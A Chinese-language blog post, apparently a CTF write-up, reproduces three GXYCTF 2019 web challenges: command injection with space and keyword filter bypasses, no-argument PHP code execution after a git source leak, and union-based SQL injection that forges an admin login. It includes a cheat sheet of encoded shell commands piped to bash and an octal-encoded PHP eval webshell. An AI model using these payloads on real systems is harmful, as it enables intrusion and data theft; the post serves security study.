@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="FBx6u1uWmY">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://chenzidu.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    sidebarPadding: 40
+  };
+</script>
+  <meta name="description" content="弄完事情吃完饭，回去做了一小时，发现几题在手机上看觉得都能出的题都没出。。。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GXYCTF[2019]复现">
+<meta property="og:url" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;01&#x2F;10&#x2F;GXYCTF-2019-%E5%A4%8D%E7%8E%B0&#x2F;index.html">
+<meta property="og:site_name" content="Chen&#39;Blog">
+<meta property="og:description" content="弄完事情吃完饭，回去做了一小时，发现几题在手机上看觉得都能出的题都没出。。。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;01&#x2F;10&#x2F;GXYCTF-2019-%E5%A4%8D%E7%8E%B0&#x2F;1.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;01&#x2F;10&#x2F;GXYCTF-2019-%E5%A4%8D%E7%8E%B0&#x2F;7.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;01&#x2F;10&#x2F;GXYCTF-2019-%E5%A4%8D%E7%8E%B0&#x2F;2.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;01&#x2F;10&#x2F;GXYCTF-2019-%E5%A4%8D%E7%8E%B0&#x2F;3.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;01&#x2F;10&#x2F;GXYCTF-2019-%E5%A4%8D%E7%8E%B0&#x2F;4.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;01&#x2F;10&#x2F;GXYCTF-2019-%E5%A4%8D%E7%8E%B0&#x2F;5.jpg">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;01&#x2F;10&#x2F;GXYCTF-2019-%E5%A4%8D%E7%8E%B0&#x2F;6.jpg">
+<meta property="og:updated_time" content="2020-01-11T07:54:02.671Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;01&#x2F;10&#x2F;GXYCTF-2019-%E5%A4%8D%E7%8E%B0&#x2F;1.jpg">
+
+<link rel="canonical" href="https://chenzidu.github.io/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>GXYCTF[2019]复现 | Chen'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Chen'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Life has its own fate, and meeting may not be accidental.</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chenzidu.github.io/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="ChenZIDu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          GXYCTF[2019]复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-01-10 19:55:51" itemprop="dateCreated datePublished" datetime="2020-01-10T19:55:51+08:00">2020-01-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-01-11 15:54:02" itemprop="dateModified" datetime="2020-01-11T15:54:02+08:00">2020-01-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>弄完事情吃完饭，回去做了一小时，发现几题在手机上看觉得都能出的题都没出。。。</strong></p>
+<a id="more"></a>
+<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>记得XCTF有道相似题型，当时一看到这题就想起来了，但是写payload的时候多打了个空格。。。试了好多次后没发现，还以为我思路错了。。。</p>
+<p>题目让我们ping ip ,127.0.0.1|ls</p>
+<p><img src="1.jpg" alt=""></p>
+<p>爆出有index.php以及flag.php，但是题目过滤了空格。</p>
+<h3 id="“奇淫技巧”：-ip-cat-IFSls"><a href="#“奇淫技巧”：-ip-cat-IFSls" class="headerlink" title="“奇淫技巧”：?ip=;cat$IFSls;"></a>“奇淫技巧”：?ip=;cat$IFS<code>ls</code>;</h3><p>也能出！！！！学到了！</p>
+<p><img src="7.jpg" alt=""></p>
+<h2 id="linux常见绕过方法"><a href="#linux常见绕过方法" class="headerlink" title="linux常见绕过方法"></a>linux常见绕过方法</h2><ol>
+<li><p>空格过滤</p>
+<blockquote>
+<p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</p>
+</blockquote>
+</li>
+<li><p>一些命令分隔符</p>
+<blockquote>
+<p>linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||<br><br>windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</p>
+</blockquote>
+</li>
+<li><p>花括号的别样用法</p>
+<blockquote>
+<p>在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令<br>{cat,flag}</p>
+</blockquote>
+</li>
+<li><p>黑名单绕过</p>
+<blockquote>
+<ol>
+<li>拼接绕过:a=l;b=s;$a$b<br></li>
+<li>编码绕过<br><br><b>base64</b>：<br>echo “Y2F0IC9mbGFn”|base64-d|bash<br> ==&gt;cat /flag<br><br><b>hex</b>：<br>echo “636174202f666c6167” | xxd -r -p|bash <br>==&gt;cat /flag<br><br><b>oct</b>：<br><br>$(printf “\154\163”) <br>==&gt;ls<br><br>$(printf “\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”)<br> ==&gt;cat /flag<br><br>{printf,”\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”}|$0 <br>==&gt;cat /flag<br><br>#可以通过这样来写webshell,内容为<?php @eval($_POST['c']);?><br>${printf,”\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76”} <br>==&gt; 1.php<br></li>
+<li>单引号和双引号绕过<br>比如：ca’’t flag 或ca””t flag</li>
+<li>反斜杠绕过<br>比如：ca\t fl\ag</li>
+<li>5、利用Shell 特殊变量绕过<br>例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。<br>$@表示（$@:同样也是获取当前shell的参数，不加引号和$*是一样的，那么加了引号如：”$@” 表示将所有的参数视为不同独立的字符串，相当于”$1” “$2”..）<br>比如：ca$@t fla$@g<br><br>ca$1t fla$2g</li>
+</ol>
+</blockquote>
+</li>
+<li><p>linux中直接查看文件内容的命令<br>cat、tac、more、less、head、tail、nl、sed、sort、uniq、</p>
+</li>
+</ol>
+<p>这道题利用$IFS构造空格，发现他还过滤了flag以及/等字符。利用变量构造。</p>
+<p>payload：<br><br><code>?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php</code></p>
+<p><img src="2.jpg" alt=""></p>
+<hr>
+<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>参考<a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/#comment-15" target="_blank" rel="noopener">Pdsdt</a></p>
+<p><strong>无参数RCE</strong></p>
+<p>git泄露源码，利用githack</p>
+<p><code>python GitHack.py http://f947babc-b762-4a48-bbe9-8fe7414d39a8.node3.buuoj.cn/.git/</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">include &quot;flag.php&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;exp&#39;]))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">            if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">                &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">                @eval($_GET[&#39;exp&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">            else&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">                die(&quot;还差一点哦！&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        else&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">            die(&quot;再好好想想！&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    else&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; highlight_file(__FILE__);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>
+<blockquote>
+<p>localeconv()   函数返回一包含本地数字及货币格式信息的数组。<br><br>scandir()   列出 images 目录中的文件和目录。<br><br>readfile()  输出一个文件。<br><br>current()       返回数组中的当前单元, 默认取第一个值。<br><br>pos()           current() 的别名。<br><br>next() 函数将内部指针指向数组中的下一个元素，并输出。<br><br>array_reverse()以相反的元素顺序返回数组。<br><br>highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</p>
+</blockquote>
+<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组，结合pos()能得到.，也就是当前目录==&gt;然后再加上scandir就能获取当前目录的所有的文件</p>
+<p>payload:<br><br>print_r(scandir(pos(localeconv())));</p>
+<p><img src="3.jpg" alt=""></p>
+<p>之后我们利用array_reverse() 将数组内容反转一下，利用next()指向flag.php文件==&gt;highlight_file()高亮输出</p>
+<hr>
+<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>在进行sql注入探测中，发现有base32解密， 解完还有一层base64，最后出来sql语句：<br><br><code>select * from user where username = &#39;$name&#39;</code><br></p>
+<p>探测一共有几个字段<br></p>
+<p><code>Error: The used SELECT statements have a different number of columns</code><br><br>通过列数不同报错，可以确定有三个字段，当为三个参数时，报账号错误<br></p>
+<p><code>0&#39; union select 0,1,3#&amp;pw=123</code><br></p>
+<p><code>wrong user!</code></p>
+<p><img src="4.jpg" alt=""></p>
+<p><img src="5.jpg" alt=""><br>当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据<br><br>当查询到有的值：<br><br><img src="6.jpg" alt=""></p>
+<p>构造payload:<br></p>
+<p><code>0&#39; union select 0,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;pw=123456</code></p>
+<h2 id="【未完待续】"><a href="#【未完待续】" class="headerlink" title="【未完待续】"></a>【未完待续】</h2>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/01/09/Python%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/" rel="prev" title="Python系统学习笔记(二)">
+      <i class="fa fa-chevron-left"></i> Python系统学习笔记(二)
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">1.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#“奇淫技巧”：-ip-cat-IFSls"><span class="nav-number">1.1.</span> <span class="nav-text">“奇淫技巧”：?ip=;cat$IFSls;</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux常见绕过方法"><span class="nav-number">2.</span> <span class="nav-text">linux常见绕过方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-禁止套娃"><span class="nav-number">3.</span> <span class="nav-text">[GXYCTF2019]禁止套娃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-BabySQli"><span class="nav-number">4.</span> <span class="nav-text">[GXYCTF2019]BabySQli</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#【未完待续】"><span class="nav-number">5.</span> <span class="nav-text">【未完待续】</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ChenZIDu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">ChenZIDu</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chenzidu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chenzidu" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:oinsm@outlook.com" title="E-Mail → mailto:oinsm@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.loongten.com/" title="https:&#x2F;&#x2F;www.loongten.com&#x2F;" rel="noopener" target="_blank">Keac's</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hsnico.github.io/" title="https:&#x2F;&#x2F;hsnico.github.io" rel="noopener" target="_blank">Hsnico'blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ChenZIDu</span>
+</div>
+  <div class="powered-by">Oinsm
+    
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Web – <a href="https://github.com/ChenZIDu" rel="noopener" target="_blank">🙂</a>
+    
+  </div>
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
